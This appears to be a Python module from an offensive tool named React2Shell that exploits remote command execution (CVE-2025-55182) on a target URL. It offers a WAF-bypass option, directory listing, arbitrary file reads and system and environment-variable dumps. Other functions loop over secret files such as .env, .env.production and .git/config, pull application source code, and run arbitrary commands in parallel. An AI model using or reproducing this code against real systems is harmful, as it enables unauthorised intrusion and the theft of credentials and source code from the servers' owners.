"""Operation functions for React2Shell."""

from typing import Dict, Any, Optional
from ..classes.executor import execute_command
from ..utils.colors import Colors, colorize
from ..utils.helpers import print_section_header


def test_vulnerability(
    target_url: str,
    timeout: int = 10,
    verify_ssl: bool = True,
    windows: bool = False,
    waf_bypass: bool = False,
    follow_redirects: bool = True,
    proxies: Optional[Dict] = None,
    rate_limit: Optional[float] = None,
    delay: Optional[float] = None
) -> Dict[str, Any]:
    """Test if server is vulnerable to CVE-2025-55182."""
    
    test_command = "echo $((41*271))" if not windows else "powershell -c \"41*271\""
    
    if waf_bypass:
        from ..classes.executor import test_with_waf_bypass
        result = test_with_waf_bypass(target_url, timeout, verify_ssl, windows)
        if isinstance(result, dict) and result.get("vulnerable") and result.get("output") == "11111":
            print(colorize("[+] Server is VULNERABLE to CVE-2025-55182!", Colors.RED + Colors.BOLD))
            print(colorize(f"[+] Successful bypass: {result.get('strategy', 'Unknown')}", Colors.GREEN))
            return result
        elif isinstance(result, dict) and result.get("status_code") == 500 and result.get("vulnerable"):
            print(colorize("[+] Server is VULNERABLE (command executed)", Colors.RED + Colors.BOLD))
            return result
        else:
            print(colorize("[?] Could not bypass WAF or server is protected", Colors.YELLOW))
            return {"vulnerable": False, "error": "WAF bypass failed"}
    
    result = execute_command(target_url, test_command, timeout, verify_ssl, windows, base64_encode=False, follow_redirects=follow_redirects, proxies=proxies, rate_limit=rate_limit, delay=delay)
    
    print()
    if result["vulnerable"] and result["output"] == "11111":
        print(colorize("[+] Server is VULNERABLE to CVE-2025-55182!", Colors.RED + Colors.BOLD))
        print(colorize("    ⚠️  Remote Code Execution is possible!", Colors.RED))
        print(colorize("    ⚠️  Server can execute arbitrary commands!", Colors.RED))
        print()
        return result
    elif result.get("vulnerable") and result.get("status_code") in [301, 302, 303, 307]:
        print(colorize("[+] Server is VULNERABLE to CVE-2025-55182!", Colors.RED + Colors.BOLD))
        print(colorize(f"    ⚠️  Redirect detected (status {result.get('status_code')}) - exploit successful!", Colors.RED))
        if result.get("output"):
            print(colorize(f"    Output: {result.get('output')}", Colors.YELLOW))
        print()
        return result
    elif result.get("status_code") == 500 and result.get("vulnerable"):
        print(colorize("[+] Server is VULNERABLE (command executed but may have failed)", Colors.RED + Colors.BOLD))
        print(colorize(f"    Status: {result.get('status_code')}", Colors.YELLOW))
        print(colorize(f"    Output: {result.get('output', 'N/A')}", Colors.YELLOW))
        print()
        return result
    elif result.get("error") and "blocked" in result.get("error", "").lower():
        print(colorize("[+] Server appears to be PROTECTED (request blocked)", Colors.GREEN))
        print(colorize("    ✓ Protection mechanisms are active", Colors.GREEN))
        print()
        return {"vulnerable": False, "error": result.get("error"), "status_code": result.get("status_code")}
    else:
        print(colorize("[?] Could not determine vulnerability status", Colors.YELLOW))
        print(f"    Status: {result.get('status_code', 'N/A')}")
        error_msg = result.get('error', 'N/A')
        print(f"    Error: {error_msg}")
        if "SSL" in error_msg:
            print(colorize("    💡 Tip: Try with --insecure flag to bypass SSL verification", Colors.CYAN))
        elif "Connection" in error_msg or "timed out" in error_msg:
            print(colorize("    💡 Tip: Server may be behind Cloudflare or blocking requests", Colors.CYAN))
            print(colorize("    💡 Tip: Try increasing timeout: --timeout 30", Colors.CYAN))
            print(colorize("    💡 Tip: Try with --waf-bypass for WAF bypass attempts", Colors.CYAN))
        print()
        return {"vulnerable": False, "error": error_msg, "status_code": result.get("status_code")}


def list_directory(target_url: str, path: str = ".", timeout: int = 10, verify_ssl: bool = True, windows: bool = False, proxies: Optional[Dict] = None, reporter=None):
    """List directory contents."""
    print_section_header("DIRECTORY LISTING")
    print(colorize(f"[*] Listing directory: {path}", Colors.CYAN))
    
    if windows:
        command = f'dir "{path}" /B'
    else:
        command = f'ls -la "{path}"'
    
    result = execute_command(target_url, command, timeout, verify_ssl, windows, base64_encode=True, proxies=proxies)
    
    if result["success"] and not result.get("is_404", False):
        print(colorize("[+] Directory listing:", Colors.GREEN))
        print(result["output"])
        if reporter:
            try:
                reporter.add_operation_data("list_directory", {
                    'path': path,
                    'output': result["output"],
                    'success': True
                })
            except Exception:
                pass
        return result["output"]
    else:
        if result.get("is_404", False):
            print(colorize(f"[-] Directory not found: {path}", Colors.YELLOW))
        elif result.get("status_code") == 500 and result.get("vulnerable"):
            print(colorize("[!] Command executed but failed to retrieve results (server is vulnerable):", Colors.YELLOW))
            if result.get("output"):
                print(result["output"])
            print(colorize(f"[!] Error: {result.get('error', 'Unknown')}", Colors.YELLOW))
        else:
            error_msg = result.get('error', 'Unknown error')
            if "not found" in error_msg.lower() or "404" in error_msg.lower():
                print(colorize(f"[-] Directory not found: {path}", Colors.YELLOW))
            else:
                print(colorize(f"[-] Failed: {error_msg}", Colors.RED))
            if result.get("raw_response"):
                print(colorize(f"[*] Response preview: {result['raw_response'][:200]}", Colors.CYAN))
        return None


def read_file(target_url: str, file_path: str, timeout: int = 10, verify_ssl: bool = True, windows: bool = False, proxies: Optional[Dict] = None, reporter=None):
    """Read file contents."""
    print_section_header("FILE READ")
    print(colorize(f"[*] Reading file: {file_path}", Colors.CYAN))
    
    if windows:
        command = f'type "{file_path}"'
    else:
        command = f'cat "{file_path}"'
    
    result = execute_command(target_url, command, timeout, verify_ssl, windows, base64_encode=True, proxies=proxies)
    
    if result["success"]:
        print(colorize("[+] File contents:", Colors.GREEN))
        print(result["output"])
        if reporter:
            try:
                reporter.add_result({
                    'type': 'read_file',
                    'file_path': file_path,
                    'output': result["output"],
                    'success': True
                })
            except Exception:
                pass
        return result["output"]
    else:
        if result.get("status_code") == 500 and result.get("vulnerable"):
            print(colorize("[!] Command executed but failed (server is vulnerable):", Colors.YELLOW))
            if result.get("output"):
                print(result["output"])
            print(colorize(f"[!] Error: {result.get('error', 'Unknown')}", Colors.YELLOW))
        else:
            print(colorize(f"[-] Failed: {result.get('error', 'Unknown error')}", Colors.RED))
            if result.get("raw_response"):
                print(colorize(f"[*] Response preview: {result['raw_response'][:200]}", Colors.CYAN))
        return None


def get_system_info(target_url: str, timeout: int = 10, verify_ssl: bool = True, windows: bool = False, proxies: Optional[Dict] = None, reporter=None):
    """Get system information."""
    print_section_header("SYSTEM INFORMATION")
    print(colorize("[*] Gathering system information...", Colors.CYAN))
    
    commands = []
    if windows:
        commands = [
            ("OS Version", 'powershell -c "$PSVersionTable.OS"'),
            ("Hostname", "hostname"),
            ("Current User", "whoami"),
            ("Environment Variables", 'powershell -c "Get-ChildItem Env: | Format-Table -AutoSize"'),
        ]
    else:
        commands = [
            ("OS Info", "uname -a"),
            ("Hostname", "hostname"),
            ("Current User", "whoami"),
            ("Environment Variables", "env | sort"),
        ]
    
    info = {}
    for name, cmd in commands:
        print(f"\n[*] Getting {name}...")
        result = execute_command(target_url, cmd, timeout, verify_ssl, windows, base64_encode=True, proxies=proxies)
        if result["success"]:
            info[name] = result["output"]
            print(colorize(f"[+] {name}:", Colors.GREEN))
            print(result["output"])
        else:
            print(colorize(f"[-] Failed to get {name}: {result.get('error', 'Unknown')}", Colors.YELLOW))
    
    if reporter:
        try:
            reporter.add_operation_data('system_info', info)
        except Exception:
            pass  # Skip if reporter fails
    
    return info


def get_app_secrets(target_url: str, timeout: int = 10, verify_ssl: bool = True, windows: bool = False, proxies: Optional[Dict] = None, reporter=None):
    """Attempt to read application secrets and config files."""
    print_section_header("APPLICATION SECRETS")
    print(colorize("[*] Attempting to read application secrets...", Colors.CYAN))
    
    secret_files = [
        ".env", ".env.local", ".env.production", ".env.development",
        "config.json", "config.js", "package.json",
        "next.config.js", "next.config.mjs", "prisma/.env", ".git/config",
    ]
    
    found_secrets = {}
    for file_path in secret_files:
        print(f"\n[*] Trying: {file_path}")
        result = execute_command(target_url, f'cat "{file_path}"', timeout, verify_ssl, windows, base64_encode=True, proxies=proxies)
        if result["success"] and not result.get("is_404", False):
            found_secrets[file_path] = result["output"]
            print(colorize(f"[+] Found: {file_path}", Colors.RED + Colors.BOLD))
            print(result["output"][:500] + ("..." if len(result["output"]) > 500 else ""))
        elif result.get("is_404", False):
            print(colorize(f"[-] File not found: {file_path}", Colors.YELLOW))
        else:
            error_msg = result.get("error", "Unknown error")
            if "not found" in error_msg.lower() or "404" in error_msg.lower():
                print(colorize(f"[-] File not found: {file_path}", Colors.YELLOW))
            else:
                print(colorize(f"[-] Not accessible: {file_path} ({error_msg})", Colors.YELLOW))
    
    if reporter:
        try:
            reporter.add_operation_data('secrets', found_secrets)
        except Exception:
            pass  # Skip if reporter fails
    
    return found_secrets


def get_app_code(target_url: str, timeout: int = 10, verify_ssl: bool = True, windows: bool = False, proxies: Optional[Dict] = None, reporter=None):
    """Attempt to read application source code."""
    print_section_header("APPLICATION CODE")
    print(colorize("[*] Attempting to read application code...", Colors.CYAN))
    
    code_paths = [
        "src/proxy.ts", "src/middleware.ts", "src/app/api/auth/login/route.ts",
        "src/lib/auth.ts", "src/lib/config.ts", "package.json", "next.config.mjs",
    ]
    
    found_code = {}
    for file_path in code_paths:
        print(f"\n[*] Trying: {file_path}")
        result = execute_command(target_url, f'cat "{file_path}"', timeout, verify_ssl, windows, base64_encode=True, proxies=proxies)
        if result["success"]:
            found_code[file_path] = result["output"]
            print(colorize(f"[+] Found: {file_path}", Colors.RED + Colors.BOLD))
            print(result["output"][:500] + ("..." if len(result["output"]) > 500 else ""))
        else:
            print(colorize(f"[-] Not found or inaccessible: {file_path}", Colors.YELLOW))
    
    if reporter:
        try:
            reporter.add_operation_data('code', found_code)
        except Exception:
            pass  # Skip if reporter fails
    
    return found_code


def custom_command(target_url: str, command: str, timeout: int = 10, verify_ssl: bool = True, windows: bool = False, base64_encode: bool = True, proxies: Optional[Dict] = None, reporter=None, parallel: Optional[int] = None):
    """Execute a custom command."""
    print_section_header("CUSTOM COMMAND")
    print(colorize(f"[*] Executing custom command: {command}", Colors.CYAN))
    
    if parallel and parallel > 1:
        from ..classes.executor import execute_parallel_commands
        commands = [cmd.strip() for cmd in command.split(';') if cmd.strip()]
        if not commands:
            commands = [command]
        
        print(colorize(f"[*] Executing {len(commands)} command(s) with {parallel} workers...", Colors.CYAN))
        results = execute_parallel_commands(
            target_url, commands, max_workers=parallel, timeout=timeout,
            verify_ssl=verify_ssl, windows=windows, base64_encode=base64_encode, proxies=proxies
        )
        
        all_output = []
        all_success = True
        for i, result in enumerate(results):
            if result.get("success"):
                output = result.get("output", "")
                all_output.append(output)
                print(colorize(f"[+] Command {i+1} output:", Colors.GREEN))
                print(output)
                if reporter:
                    try:
                        reporter.add_result({
                            'type': 'custom_command',
                            'command': commands[i] if i < len(commands) else command,
                            'output': output,
                            'success': True
                        })
                    except Exception:
                        pass
            else:
                all_success = False
                error = result.get('error', 'Unknown error')
                print(colorize(f"[-] Command {i+1} failed: {error}", Colors.RED))
                if reporter:
                    try:
                        reporter.add_result({
                            'type': 'custom_command',
                            'command': commands[i] if i < len(commands) else command,
                            'output': '',
                            'success': False,
                            'error': error
                        })
                    except Exception:
                        pass
        
        return {
            'success': all_success,
            'output': '\n'.join(all_output),
            'results': results
        }
    
    result = execute_command(target_url, command, timeout, verify_ssl, windows, base64_encode=base64_encode, proxies=proxies)
    
    if result["success"]:
        print(colorize("[+] Command output:", Colors.GREEN))
        print(result["output"])
        if reporter:
            try:
                reporter.add_result({
                    'type': 'custom_command',
                    'command': command,
                    'output': result["output"],
                    'success': True
                })
            except Exception:
                pass
        return result
    else:
        if result.get("status_code") == 500 and result.get("vulnerable"):
            print(colorize("[!] Command executed but failed (server is vulnerable):", Colors.YELLOW))
            if result.get("output"):
                print(result["output"])
            print(colorize(f"[!] Error: {result.get('error', 'Unknown')}", Colors.YELLOW))
        else:
            print(colorize(f"[-] Command failed: {result.get('error', 'Unknown error')}", Colors.RED))
            if result.get("raw_response"):
                print(colorize(f"[*] Response preview: {result['raw_response'][:200]}", Colors.CYAN))
        return result

